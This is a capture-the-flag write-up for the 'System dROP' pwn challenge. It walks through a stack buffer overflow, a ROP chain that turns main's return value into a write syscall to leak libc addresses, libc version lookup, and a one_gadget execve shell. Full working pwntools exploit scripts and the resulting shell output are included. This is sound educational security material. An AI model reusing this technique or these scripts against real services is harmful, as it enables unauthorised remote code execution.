# System dROP

The description for this challenge is as follows:

*In the dark night, we managed to sneak in the plant that manages all the resources. Ready to deploy our root-kit and stop this endless draining of our planet, we accidentally triggered the alarm! Acid started raining from the ceiling, destroying almost everything but us and small terminal-like console. We can see no output, but it still seems to work, somehow..
This challenge will raise 33 euros for a good cause.*

This is a pwn challenge that was rated at one out of four stars, so relatively easy. As you might be able to guess, it's another ROP challenge.

**TL;DR Solution:** I solved this challenge by taking advantage of the fact that the main function returns 1 in order to call a write syscall, leak libc addresses, use blukat to derive the libc version, and use a onegadget to pop a shell.

Initially, we just run the program to see what happens. It immediately let me input a string, so I made it quite long and got a segfault.

```
knittingirl@piglet:~/CTF/HTBApocalypse/systemdrop$ ./system_drop
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault

```
This looks promising! Now we need to run checksec; NX is enabled, so no shellcode, but that was to be expected given the challenge title.

```
knittingirl@piglet:~/CTF/HTBApocalypse/systemdrop$ checksec system_drop
[*] '/home/knittingirl/CTF/HTBApocalypse/systemdrop/system_drop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```


Next, I opened it up in Ghidra to have a look. The program is very small, so I have copied the entire contents of main() below:

```
undefined8 main(void)

{
  undefined local_28 [32];
  
  alarm(0xf);
  read(0,local_28,0x100);
  return 1;
}
```
The big problem here for a traditional ret2libc attack is that there is no function here to print output to the screen. Eventually, as I was scrolling throught the Ghidra Symbol Tree to check for some sort of win function, I noticed the syscall and realized that this might be very relevant given the challenge name. 

If you've ever done a static ROP challenge, particularly if you've tried to use an automatic ROP chain tool, you'll know that common practice for these is to use a syscall in order to call execve(). To do that, you have to set the rax register to 59 (in x86-64), and then set the rdi, rsi, and rdx registers as normal, preferrably with /bin/sh, 0, and 0. Initially, I tried to go straight to calling execve with the syscall, but after staring at ROPgadget results for any real way to control rax or one of its subregisters (i.e. eax, ax, or al), I gave up on that approach.

However, I realized that since the main gadget returns 1 at the end, this means that if I call syscall at the end, I will get a write syscall. Also, since we called read() with 0x100 as its third parameter, this should persist in rdx and not force us to use a ret2csu. As a result, we can leak the libc addresses from the GOT table. Now, the challenge did not actually come packaged with the libc version that it used, but there is a wonderful online tool at https://libc.blukat.me/ that will identify a libc version based on the known offsets (last three hexadecimal digits) of libc leaks. So, I put all of this together to create an appropriate script, shown here:

```
from pwn import *

#target = process('./system_drop')

#pid = gdb.attach(target, "\nb *main+45\n set disassembly-flavor intel\ncontinue")

target = remote ('138.68.147.93', 31865)

#Gadgets:

read_got_plt = p64(0x601020)
alarm_got_plt = p64(0x601018)
main = p64(0x00400541)

pop_rdi = p64(0x00000000004005d3) # : pop rdi ; ret
pop_rsi = p64(0x00000000004005d1) # : pop rsi ; pop r15 ; ret
syscall = p64(0x000000000040053b) # : syscall

#Payload creation:

#determined in an earlier run with the cyclic method
padding = b'a' * 40

payload = padding
payload += pop_rdi
payload += p64(1)
payload += pop_rsi
#My pop rsi also pops r15, which is typical, so I need padding to fill it.
payload += alarm_got_plt + p64(0)
payload += syscall
payload += main

target.sendline(payload)

result = target.recvuntil(b'\x00\x00\x00', timeout = 100)
print('We got result')
print(result)
alarm_unproc = result[:8]
alarm_libc = u64(alarm_unproc)
print(hex(alarm_libc))

target.interactive()
```

And the result of running that should be:

```
knittingirl@piglet:~/CTF/HTBApocalypse$ python3 system_drop_writeup.py 
[+] Opening connection to 138.68.147.93 on port 31865: Done
[*] '/home/knittingirl/CTF/HTBApocalypse/system_drop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/knittingirl/CTF/HTBApocalypse/system_drop_libc.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
We got result
b'\x10&7\xca\x0c\x7f\x00\x00@\xe19\xca\x0c\x7f\x00\x00\x00'
0x7f0cca372610
[*] Switching to interactive mode
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
$ 
[*] Interrupted

```
If you switch the script slightly to write the contents of the read_got_plt gadget instead of alarm_got_plt, that will give you a result of:
```
0x7ff107e73140
```

Now, if you plug those numbers into the blukat tool, you get exactly one result:

![Blukat Screenshot](screenshots/Blukat_Screenshot.png?raw=true)

The tool will actually show you vital offsets for libc gadgets like system() and /bin/sh, but I prefer to download the library and run onegadget. That also lets us do the LD_PRELOAD trick locally for debugging purposes. So, we run onegadget on the libc file:

```
knittingirl@piglet:~/CTF/HTBApocalypse/systemdrop$ one_gadget system_drop_libc.so 
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

```

And now we are ready to put it all together into a final script; I will note that I had a slight struggle with my onegadgets and ended up using the second one (0x4f432), with nulls appended to the end of my payload in order to over rsp+0x40 with those nulls and satisfy my constraint. The resulting script is shown below:

```
from pwn import *

target = process('./system_drop', env={"LD_PRELOAD":"./system_drop_libc.so"})

pid = gdb.attach(target, "\nb *main+45\n set disassembly-flavor intel\ncontinue")

#target = remote ('139.59.168.47', 31111)

elf = ELF("system_drop")
libc = ELF("system_drop_libc.so")

#Gadgets:

onegadget_offset = 0x4f432
read_got_plt = p64(0x601020)
alarm_got_plt = p64(0x601018)
main = p64(0x00400541)

pop_rdi = p64(0x00000000004005d3) # : pop rdi ; ret
pop_rsi = p64(0x00000000004005d1) # : pop rsi ; pop r15 ; ret


syscall = p64(0x000000000040053b) # : syscall

padding = b'a' * 40

payload = padding
payload += pop_rdi
payload += p64(1)
payload += pop_rsi
payload += alarm_got_plt + p64(0)
payload += syscall
payload += main


target.sendline(payload)

result = target.recvuntil(b'\x00\x00\x00', timeout = 100)
print('We got result')
print(result)
alarm_unproc = result[:8]
alarm_libc = u64(alarm_unproc)
print(hex(alarm_libc))
#The library is libc6_2.27-3ubuntu1.4_amd64

libc_base = alarm_libc - libc.symbols['alarm']
onegadget = libc_base + onegadget_offset

payload = padding

payload += p64(onegadget) + b'\x00' * 0x50

target.sendline(payload)

target.interactive()

```
And the result we should see in the terminal is:

```
ubuntu@ubuntu1804:~/CTF/HTBApocalypse$ python3 system_drop_payload.py  NOPTRACE
[+] Opening connection to 139.59.168.47 on port 31111: Done
[*] '/home/ubuntu/CTF/HTBApocalypse/system_drop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/ubuntu/CTF/HTBApocalypse/system_drop_libc.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
We got result
b'\x10\xa6\xeb\r\x14\x7f\x00\x00@a\xee\r\x14\x7f\x00\x00\x00'
0x7f140deba610
about to send a payload b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa2T\xe2\r\x14\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
we sent another payload
[*] Switching to interactive mode
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$ whoami
ctf
$ ls
flag.txt  system_drop
$ cat flag.txt
CHTB{n0_0utput_n0_pr0bl3m_w1th_sr0p}

```
